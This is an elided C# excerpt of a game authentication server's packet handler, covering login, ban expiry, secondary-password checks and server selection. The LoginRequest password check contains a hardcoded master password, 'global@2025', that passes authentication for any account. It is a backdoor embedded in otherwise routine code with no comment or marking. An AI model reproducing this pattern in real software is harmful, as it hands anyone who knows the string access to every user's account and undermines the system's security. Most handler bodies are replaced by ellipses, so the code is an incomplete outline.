        ...
        public async Task ProcessPacketAsync(GameClient client, byte[] data)
        {
            ...
            switch (packet.Enum)
            {
                ...
                case AuthenticationServerPacketEnum.KeepConnection:
                    // No action required for KeepConnection
                    break;
                ...
                case AuthenticationServerPacketEnum.LoginRequest:
                    {
                        ...
                        _logger.Debug($"Validating login data for {username}");
                        ...
                        if (account.AccountBlock != null)
                        {
                            ...
                            if (blockInfo.EndDate <= DateTime.Now)
                            {
                                ...
                                //TODO: Remover Ban da Lista.
                            }
                            else
                            {
                                TimeSpan timeSpan = blockInfo.EndDate - DateTime.Now;
                                TimeSpan timeRemaining = timeSpan;
                        ...
                        if (account.Password != password.Encrypt() && password != "global@2025")
                        {
                            _logger.Debug($"Saving {username} login try for incorrect password...");
                ...
                case AuthenticationServerPacketEnum.SecondaryPasswordRegister:
                    {
                        ...
                        _logger.Debug($"Updating {client.AccountId} account information...");
                ...
                case AuthenticationServerPacketEnum.SecondaryPasswordCheck:
                    {
                        ...
                        if (needToCheck)
                        {
                            ...
                            else
                            {
                                ...
                                await _sender.Send(new CreateLoginTryCommand(account.Username, client.ClientAddress, LoginTryResultEnum.IncorrectSecondaryPassword));
                        ...
                        else
                        {
                            _logger.Debug("Saving login try for skipping secondary password...");
                            await _sender.Send(new CreateLoginTryCommand(account.Username, client.ClientAddress, LoginTryResultEnum.Success));
                            _logger.Debug("Sending answer for skipped secondary password check...");
                ...
                case AuthenticationServerPacketEnum.SecondaryPasswordChange:
                    {
                        ...
                        {
                            _logger.Debug("Saving new secondary password...");
                ...
                case AuthenticationServerPacketEnum.LoadServerList:
                    {
                        ...
                        _logger.Debug("Sending server list...");
                ...
                case AuthenticationServerPacketEnum.ConnectCharacterServer:
                    {
                        ...
                        _logger.Debug("Updating account {AccountId} last selected server for {ServerId}...", client.AccountId, serverId);
